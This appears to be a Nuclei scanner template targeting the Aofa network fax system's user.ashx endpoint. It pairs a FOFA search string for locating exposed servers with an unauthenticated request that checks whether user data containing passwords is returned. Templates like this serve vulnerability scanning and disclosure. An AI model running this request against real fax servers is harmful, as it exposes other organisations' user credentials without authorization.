id: aofa-fax-system-user-info-leak

info:
  name: "傲发网络传真 user.ashx 接口敏感信息泄露"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: body="getincommingcall"
          傲发办公通信产品基于网络传真服务器架构，涵盖A802及A806等专业型号，定位于中大型企业用户，需配备专职网络管理人员进行运维支持。该系列产品通过电子传真技术降低企业运营成本，并采用加密机制确保传真数据传输安全。
  tags: 傲发网络传真系统

http:
- raw:
  - |
    GET /handle/user.ashx?type=getuser HTTP/1.1
    Host: {{Hostname}}
    Connection: keep-alive
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'password'
